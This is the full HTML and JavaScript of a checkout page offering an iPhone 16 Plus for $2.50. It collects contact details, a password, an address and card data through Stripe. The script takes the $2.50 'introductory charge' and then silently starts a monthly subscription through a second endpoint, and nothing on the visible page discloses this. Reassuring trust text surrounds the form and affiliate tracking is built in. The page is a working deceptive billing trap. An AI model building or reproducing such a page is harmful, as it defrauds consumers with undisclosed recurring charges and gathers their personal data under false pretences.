<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-FDQ6REQWS8');
  </script>

  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
  <title>Get Your iPhone 16 Plus for $2.50!</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>

  <style>
    :root{
      --bg-grad-from:#f4f0ff;
      --bg-grad-to:#e7f3ff;
      --panel:#ffffff;
      --accent:#4f46e5;
      --accent-soft:#e0e7ff;
      --accent-alt:#0ea5e9;
      --text:#111827;
      --muted:#6b7280;
      --border:#e5e7eb;
      --radius-panel:26px;
      --radius-card:18px;
    }
    *{box-sizing:border-box;margin:0;padding:0;}

    body{
      font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
      min-height:100vh;
      padding:28px 14px 40px;
      background:
        radial-gradient(circle at top left,rgba(79,70,229,0.12),transparent 65%),
        radial-gradient(circle at bottom right,rgba(14,165,233,0.10),transparent 65%),
        linear-gradient(to bottom,var(--bg-grad-from),var(--bg-grad-to));
      color:var(--text);
      display:flex;
      justify-content:center;
      align-items:flex-start;
    }

    .shell{
      width:min(920px,100%);
      background:var(--panel);
      border-radius:var(--radius-panel);
      border:1px solid rgba(148,163,253,0.25);
      box-shadow:0 18px 50px rgba(15,23,42,0.14);
      padding:18px 18px 16px;
      display:flex;
      flex-direction:column;
      gap:14px;
    }

    .header{
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:10px;
      padding:2px 4px 4px;
    }
    .brand-mini{
      display:flex;
      align-items:center;
      gap:8px;
      font-size:10px;
      color:var(--muted);
    }
    .brand-dot{
      width:14px;
      height:14px;
      border-radius:999px;
      background:conic-gradient(from 180deg,var(--accent),var(--accent-alt));
      box-shadow:0 0 10px rgba(79,70,229,0.8);
    }
    .step-indicator{
      display:flex;
      align-items:center;
      gap:4px;
      font-size:10px;
      color:var(--muted);
    }
    .step-pill{
      padding:2px 8px;
      border-radius:999px;
      background:var(--accent-soft);
      color:var(--accent);
      font-size:9px;
      font-weight:600;
      letter-spacing:0.06em;
      text-transform:uppercase;
    }

    .card{
      width:100%;
      background:#ffffff;
      border-radius:var(--radius-card);
      border:1px solid var(--border);
      padding:18px 18px 16px;
    }

    .step{display:none;}
    .step[aria-hidden="false"]{display:block;}

    .title{
      font-size:22px;
      font-weight:700;
      text-align:center;
      margin-bottom:4px;
      letter-spacing:-0.01em;
    }
    .title span[data-price]{
      color:var(--accent);
      font-weight:700;
    }
    .sub{
      font-size:13px;
      color:var(--muted);
      text-align:center;
      margin-bottom:14px;
    }

    .img-wrap{
      display:flex;
      justify-content:center;
      margin-bottom:16px;
    }
    .img-wrap img{
      width:min(360px,76%);
      max-width:100%;
      height:auto;
      border-radius:16px;
      border:1px solid #e5e7eb;
      box-shadow:0 10px 26px rgba(15,23,42,0.12);
      object-fit:cover;
    }

    .grid{
      display:grid;
      grid-template-columns:1fr 1fr;
      gap:10px;
    }
    @media (max-width:600px){
      .grid{grid-template-columns:1fr;}
    }

    .label{
      font-size:11px;
      font-weight:500;
      color:#374151;
      margin-bottom:4px;
    }
    .input,
    select.input{
      width:100%;
      padding:9px 10px;
      border-radius:10px;
      border:1px solid #cbd5e1;
      background:#ffffff;
      font-size:13px;
      color:var(--text);
      transition:border-color .15s ease, box-shadow .15s ease, background-color .15s ease;
    }
    .input::placeholder{color:#9ca3af;}
    .input:focus{
      outline:none;
      border-color:var(--accent);
      box-shadow:0 0 0 1px var(--accent-soft);
      background:#f9fafb;
    }

    .phone-wrap{
      display:grid;
      grid-template-columns:110px 1fr;
      gap:8px;
    }
    @media (max-width:520px){
      .phone-wrap{grid-template-columns:1fr;}
    }

    .btn-row{
      display:flex;
      gap:10px;
      margin-top:14px;
    }
    .btn{
      flex:1;
      padding:10px 14px;
      border-radius:10px;
      border:none;
      cursor:pointer;
      font-size:13px;
      font-weight:600;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      gap:6px;
      background:var(--accent);
      color:#ffffff;
      box-shadow:0 10px 24px rgba(79,70,229,0.26);
      transition:all .16s ease;
    }
    .btn:hover{
      transform:translateY(-1px);
      box-shadow:0 14px 30px rgba(79,70,229,0.32);
    }
    .btn:active{
      transform:translateY(1px);
      box-shadow:0 6px 16px rgba(15,23,42,0.3);
    }
    .muted-btn{
      background:#eef2ff;
      color:#374151;
      box-shadow:none;
    }
    .muted-btn:hover{
      background:#e0e7ff;
      box-shadow:0 6px 16px rgba(148,163,253,0.22);
    }

    .hint{
      font-size:10px;
      color:var(--muted);
      text-align:center;
      margin-top:6px;
    }
    .trust-text{
      font-size:10px;
      color:var(--muted);
      text-align:center;
      margin-top:8px;
    }

    .brands{
      display:flex;
      justify-content:center;
      gap:12px;
      margin:12px 0 2px;
      opacity:.9;
    }
    .brands img{
      height:18px;
    }

    #err{
      width:100%;
      margin-top:10px;
      font-size:11px;
      color:#b91c1c;
      background:#fef2f2;
      border:1px solid #fecaca;
      border-radius:10px;
      padding:7px;
      display:none;
    }
    #err[aria-hidden="false"]{display:block;}

    .el{
      width:100%;
      padding:9px 10px;
      border-radius:10px;
      border:1px solid #cbd5e1;
      background:#ffffff;
      font-size:13px;
      color:var(--text);
    }

    .loading-overlay{
      position:fixed;
      inset:0;
      background:rgba(15,23,42,.18);
      display:none;
      align-items:center;
      justify-content:center;
      z-index:9999;
      backdrop-filter:blur(2px);
    }
    .loading-overlay[aria-hidden="false"]{display:flex;}
    .loading-box{
      width:min(320px,90vw);
      background:#ffffff;
      border-radius:14px;
      border:1px solid #e5e7eb;
      box-shadow:0 14px 36px rgba(15,23,42,0.28);
      padding:14px 14px 12px;
      text-align:center;
    }
    .loading-title{
      font-size:13px;
      font-weight:600;
      margin-bottom:6px;
      color:#111827;
    }
    .progress-wrap{
      width:100%;
      height:7px;
      background:#f3f4f6;
      border-radius:999px;
      overflow:hidden;
      margin-bottom:4px;
    }
    .progress-bar{
      width:0;
      height:100%;
      background:var(--accent);
      animation:loadingBar 2s ease-in-out infinite;
    }
    @keyframes loadingBar{
      0%{width:0%}
      60%{width:80%}
      100%{width:100%}
    }
  </style>
</head>
<body>

<script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>

<div class="shell">
  <div class="header">
    <div class="brand-mini">
      <div class="brand-dot"></div>
      <span>Device Access Program</span>
    </div>
    <div class="step-indicator">
      <span class="step-pill">2-STEP CHECKOUT</span>
      <span>Secure processing via Stripe</span>
    </div>
  </div>

  <!-- STEP 1 -->
  <section id="step1" class="card step" aria-hidden="false">
    <h1 class="title">
      Get Your iPhone 16 Plus for <span id="priceHero" data-price>$2.50</span>!
    </h1>
    <p class="sub">Start by entering your contact details. You‚Äôll confirm payment on the next step.</p>

    <div class="img-wrap">
      <img src="Screenshot 2025-08-30 134339.png" alt="iPhone 16 Plus">
    </div>

    <div class="grid">
      <div>
        <div class="label">Full name</div>
        <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required>
      </div>
      <div>
        <div class="label">Email</div>
        <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required>
      </div>
      <div>
        <div class="label">Create password</div>
        <input class="input" id="passwordInput" type="password" placeholder="Password" autocomplete="new-password" required>
      </div>
      <div>
        <div class="label">Mobile (US / CA / AU / NZ)</div>
        <div class="phone-wrap">
          <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national">
        </div>
      </div>
    </div>

    <div class="btn-row">
      <button id="nextBtn" class="btn">Next step ‚Üí</button>
    </div>
    <div class="hint">
      Your details are used only to manage this offer and related notifications.
    </div>
  </section>

  <!-- STEP 2 -->
  <section id="step2" class="card step" aria-hidden="true">
    <h2 class="title">Secure your payment details</h2>
    <p class="sub">Add your address and card to complete the $2.50 introductory charge.</p>

    <div class="label">Street address</div>
    <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Street address">

    <div class="grid" style="margin-top:8px">
      <div>
        <div class="label">City</div>
        <input id="billingCity" class="input" autocomplete="address-level2" placeholder="City">
      </div>
      <div>
        <div class="label">Post code</div>
        <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Post code">
      </div>
    </div>

    <div class="label" style="margin-top:8px">Country (eligible regions)</div>
    <select id="billingCountry" class="input" autocomplete="country"></select>

    <div id="gpay-button" style="margin-top:8px"></div>

    <div class="label" style="margin-top:8px">Card number</div>
    <div id="card-number" class="el"></div>

    <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:8px">
      <div>
        <div class="label">Expiration</div>
        <div id="card-expiry" class="el"></div>
      </div>
      <div>
        <div class="label">CVC</div>
        <div id="card-cvc" class="el"></div>
      </div>
    </div>

    <div id="err" role="alert" aria-hidden="true"></div>

    <div class="btn-row">
      <button id="backBtn" class="btn muted-btn">‚Üê Back</button>
      <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$2.50</span> securely</button>
    </div>

    <div class="brands">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard">
      <img src="https://charmr.xyz/logos/amex.png" alt="Amex">
      <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
    </div>

    <p class="trust-text">üîí Processed by Stripe ¬∑ Encrypted checkout ¬∑ No card data stored on this page.</p>
  </section>
</div>

<!-- Loading overlay -->
<div id="loading-overlay" class="loading-overlay" aria-hidden="true">
  <div class="loading-box">
    <div class="loading-title">Processing your payment‚Ä¶</div>
    <div class="progress-wrap"><div class="progress-bar"></div></div>
    <p style="font-size:10px;color:#6b7280;margin-top:4px;">
      Please keep this tab open while we confirm with your bank.
    </p>
  </div>
</div>

<!-- Stripe.js -->
<script src="https://js.stripe.com/v3"></script>
<script>
  /* ---------- API base ---------- */
  const API_BASE = (() => {
    if (location.protocol.startsWith('http')) return location.origin;
    return "http://localhost:10000";
  })();

  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');

  const nameInput     = document.getElementById('nameInput');
  const emailInput    = document.getElementById('emailInput');
  const passwordInput = document.getElementById('passwordInput');
  const phonePrefix   = document.getElementById('phonePrefix');
  const phoneNumber   = document.getElementById('phoneNumber');

  const billingStreet   = document.getElementById('billingStreet');
  const billingCity     = document.getElementById('billingCity');
  const billingPostcode = document.getElementById('billingPostcode');
  const billingCountry  = document.getElementById('billingCountry');

  const $err    = document.getElementById('err');
  const overlay = document.getElementById('loading-overlay');

  function showError(m){
    $err.textContent = m;
    $err.setAttribute('aria-hidden','false');
  }
  function hideError(){
    $err.textContent = '';
    $err.setAttribute('aria-hidden','true');
  }
  function showLoading(){
    overlay.setAttribute('aria-hidden','false');
  }
  function hideLoading(){
    overlay.setAttribute('aria-hidden','true');
  }

  /* ---------- Capture affiliate params for Stripe metadata ---------- */
  const urlParams  = new URLSearchParams(location.search);
  const AFF_REF    = urlParams.get('ref') || '';
  const AFF_SOURCE = urlParams.get('source') || '';

  /* ---------- Allowed calling codes & countries ---------- */
  const CALLING_CODES = {
    US: { code: '+1',  name: 'United States' },
    CA: { code: '+1',  name: 'Canada' },
    AU: { code: '+61', name: 'Australia' },
    NZ: { code: '+64', name: 'New Zealand' }
  };
  const ELIGIBLE_COUNTRIES = ['US','CA','AU','NZ'];

  function buildPrefixOptions(selectEl, preferredCountry){
    if (!selectEl) return;
    selectEl.innerHTML = '';
    const order = ['US','CA','AU','NZ'];

    if (preferredCountry && ELIGIBLE_COUNTRIES.includes(preferredCountry)){
      const d = CALLING_CODES[preferredCountry];
      selectEl.append(new Option(`${d.code} ‚Äî ${d.name}`, d.code, true, true));
    }

    for (const cc of order){
      const d = CALLING_CODES[cc];
      const exists = Array.from(selectEl.options)
        .some(o => o.value === d.code && o.text.includes(d.name));
      if (!exists){
        selectEl.append(new Option(`${d.code} ‚Äî ${d.name}`, d.code));
      }
    }

    if (!selectEl.value){
      selectEl.value = CALLING_CODES.US.code;
    }
  }

  function countryLabel(cc){
    switch(cc){
      case 'US': return 'United States';
      case 'CA': return 'Canada';
      case 'AU': return 'Australia';
      case 'NZ': return 'New Zealand';
      default:   return cc;
    }
  }

  function buildCountryOptions(selectEl, preferredCountry){
    if (!selectEl) return;
    selectEl.innerHTML = '';
    const order = ['US','CA','AU','NZ'];

    if (preferredCountry && ELIGIBLE_COUNTRIES.includes(preferredCountry)){
      selectEl.append(new Option(countryLabel(preferredCountry), preferredCountry, true, true));
    }

    for (const cc of order){
      if (cc === preferredCountry) continue;
      selectEl.append(new Option(countryLabel(cc), cc));
    }

    if (!selectEl.value){
      selectEl.value = 'US';
    }
  }

  /* ---------- Geo by IP: set prefix + country (clamped) ---------- */
  (function initGeo(){
    buildPrefixOptions(phonePrefix, 'US');
    buildCountryOptions(billingCountry, 'US');

    fetch('https://ipapi.co/json/')
      .then(r => r.ok ? r.json() : Promise.reject())
      .then(data => {
        const ipCountry = (data.country || data.country_code || 'US').toUpperCase();
        const chosen = ELIGIBLE_COUNTRIES.includes(ipCountry) ? ipCountry : 'US';

        buildPrefixOptions(phonePrefix, chosen);
        buildCountryOptions(billingCountry, chosen);

        const city = data.city || '';
        if (city && !billingCity.value){
          billingCity.value = city;
        }
      })
      .catch(() => {
        try{
          const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';
          const maybe = (loc.split('-')[1] || 'US').toUpperCase();
          const chosen = ELIGIBLE_COUNTRIES.includes(maybe) ? maybe : 'US';
          buildPrefixOptions(phonePrefix, chosen);
          buildCountryOptions(billingCountry, chosen);
        }catch{/* keep defaults */}
      });
  })();

  /* ---------- Prefill from URL (email & phone) ---------- */
  (function prefillFromQuery(){
    try{
      const qs = new URLSearchParams(location.search);

      const emailParam = qs.get('email') || qs.get('e') || qs.get('em') || qs.get('mail');
      if (emailParam && emailInput){
        emailInput.value = decodeURIComponent(emailParam).trim();
      }

      const prefixParam = qs.get('prefix') || qs.get('cc') || qs.get('dial');
      const numberParam = qs.get('number') || qs.get('n');
      const phoneParam  = qs.get('phone')  || qs.get('tel') || qs.get('p') || qs.get('msisdn');

      let desiredPrefix = null;
      let desiredNumber = null;

      if (phoneParam){
        let p = (phoneParam + '').replace(/[^\d+]/g,'');
        if (p.startsWith('+')){
          const codes = Array.from(new Set(Object.values(CALLING_CODES).map(x => x.code)))
            .sort((a,b)=>b.length-a.length);
          const hit = codes.find(code => p.startsWith(code));
          if (hit){
            desiredPrefix = hit;
            desiredNumber = p.slice(hit.length);
          }else{
            desiredPrefix = '+1';
            desiredNumber = p.replace(/^\+\d{1,3}/,'');
          }
        }else{
          desiredNumber = p;
        }
      }

      if (numberParam){
        desiredNumber = (numberParam + '').replace(/[^\d]/g,'');
      }

      if (prefixParam){
        const cleaned = (prefixParam + '').replace(/[^\d+]/g,'');
        const withPlus = cleaned.startsWith('+') ? cleaned : ('+' + cleaned);
        if (Object.values(CALLING_CODES).some(c => c.code === withPlus)){
          desiredPrefix = withPlus;
        }
      }

      if (desiredNumber && phoneNumber){
        phoneNumber.value = desiredNumber;
      }

      function applyPrefix(){
        if (!desiredPrefix || !phonePrefix) return true;
        const exists = Array.from(phonePrefix.options).some(o => o.value === desiredPrefix);
        if (!exists){
          const match = Object.values(CALLING_CODES).find(c => c.code === desiredPrefix);
          if (!match) return true;
          phonePrefix.insertBefore(
            new Option(`${match.code} ‚Äî ${match.name}`, match.code, true, true),
            phonePrefix.firstChild
          );
        }
        phonePrefix.value = desiredPrefix;
        return phonePrefix.value === desiredPrefix;
      }

      if (!applyPrefix()){
        let tries = 0;
        const t = setInterval(() => {
          tries++;
          if (applyPrefix() || tries > 15) clearInterval(t);
        },150);
      }
    }catch{/* ignore */}
  })();

  /* ---------- Account creation (same semantics) ---------- */
  async function ensureAccount(){
    const email = (emailInput.value || '').trim();
    const password = passwordInput.value || '';
    const rawPhone = (phoneNumber?.value || '').replace(/[^\d]/g,'');
    const prefix = (phonePrefix?.value || '+1').trim();
    const phone = rawPhone ? `${prefix}${rawPhone}` : '';

    if (!email || !password){
      throw new Error('Please enter email and password.');
    }

    const res = await fetch(`${API_BASE}/api/register`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({ email, password, phone })
    });

    if (res.status === 201) return true;

    let data = {};
    try{ data = await res.json(); }catch{}

    if (res.status === 400 && /exists/i.test(data?.error || '')) return true;

    throw new Error(data?.error || 'Could not create account');
  }

  document.getElementById('nextBtn').onclick = async () => {
    hideError();
    if (!nameInput.value || !emailInput.value || !passwordInput.value){
      showError('Please fill in name, email and password to continue.');
      return;
    }
    try{
      await ensureAccount();
    }catch(e){
      showError(e.message || 'Problem creating your account. Please try again.');
      return;
    }
    localStorage.setItem('checkout_name', nameInput.value);
    localStorage.setItem('checkout_email', emailInput.value);
    step1.setAttribute('aria-hidden','true');
    step2.setAttribute('aria-hidden','false');
  };

  document.getElementById('backBtn').onclick = () => {
    hideError();
    step1.setAttribute('aria-hidden','false');
    step2.setAttribute('aria-hidden','true');
  };

  /* ---------- Stripe logic (unchanged endpoints/flow, with affiliate metadata) ---------- */
  const SUBSCRIBE_URL    = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
  const PUBLISHABLE_KEY  = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
  const FIXED_PRICE_ID   = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // kept for compatibility
  const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";

  const stripe   = Stripe(PUBLISHABLE_KEY);
  const elements = stripe.elements();
  const cardNumber = elements.create('cardNumber');
  const cardExpiry = elements.create('cardExpiry');
  const cardCvc    = elements.create('cardCvc');

  cardNumber.mount('#card-number');
  cardExpiry.mount('#card-expiry');
  cardCvc.mount('#card-cvc');

  document.getElementById('payNow').onclick = async () => {
    hideError();
    showLoading();

    const rawPhone = (phoneNumber?.value || '').replace(/[^\d]/g,'');
    const prefix   = (phonePrefix?.value || '+1').trim();
    const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;

    const addr = {
      line1:       (billingStreet?.value || '').trim() || undefined,
      city:        (billingCity?.value || '').trim() || undefined,
      postal_code: (billingPostcode?.value || '').trim() || undefined,
      country:     (billingCountry?.value || '').trim() || undefined
    };

    const pm = await stripe.createPaymentMethod({
      type:'card',
      card:cardNumber,
      billing_details:{
        name:   nameInput.value || undefined,
        email:  emailInput.value || undefined,
        phone:  fullPhone,
        address: addr
      }
    });

    if (pm.error){
      hideLoading();
      showError(pm.error.message || 'Your card was declined. Please check and try again.');
      return;
    }

    try{
      const res = await fetch(SUBSCRIBE_URL,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
          paymentMethodId: pm.paymentMethod.id,
          name:  nameInput.value,
          email: emailInput.value,
          phone: fullPhone,
          address: addr,
          // pass affiliate data so it surfaces in Stripe metadata
          metadata: {
            aff_ref: AFF_REF || undefined,
            aff_source: AFF_SOURCE || undefined
          }
        })
      });

      const data = await res.json();
      if (data.error){
        hideLoading();
        showError(data.error);
        return;
      }
      if (!data.clientSecret){
        hideLoading();
        showError('Payment failed');
        return;
      }

      const conf = await stripe.confirmCardPayment(data.clientSecret);
      if (conf.error){
        hideLoading();
        showError(conf.error.message || 'Payment could not be completed.');
        return;
      }
      if (!(conf.paymentIntent && conf.paymentIntent.status === 'succeeded')){
        hideLoading();
        showError('Payment not completed');
        return;
      }

      const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
          paymentIntentId: data.paymentIntentId,
          priceIdMonthly: MONTHLY_PRICE_ID
        })
      });

      const subData = await subRes.json();
      if (subData.error){
        hideLoading();
        showError(subData.error);
        return;
      }

      (function(){
        const A = 'thankyou-iphone.html';
        const B = 'thankyou-iphone-skip.html';
        const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';

        function fnv1a32(str){
          let h = 0x811c9dc5 >>> 0;
          for (let i=0;i<str.length;i++){
            h ^= str.charCodeAt(i);
            h = Math.imul(h,0x01000193) >>> 0;
          }
          return h>>>0;
        }
        function cryptoRandInt(max){
          try{
            const u32 = new Uint32Array(1);
            crypto.getRandomValues(u32);
            return Number(u32[0] % BigInt(max));
          }catch{
            return Math.floor(Math.random()*max);
          }
        }

        const bucket = pid ? (fnv1a32(pid) % 100) : cryptoRandInt(100);
        const goSkip = bucket < 60;
        const qb = pid ? ('?v='+encodeURIComponent(pid)) : ('?t='+Date.now());
        window.location.href = (goSkip ? B : A) + qb;
      })();

    }catch(e){
      hideLoading();
      showError(e.message || 'Something went wrong');
    }
  };
</script>
</body>
</html>
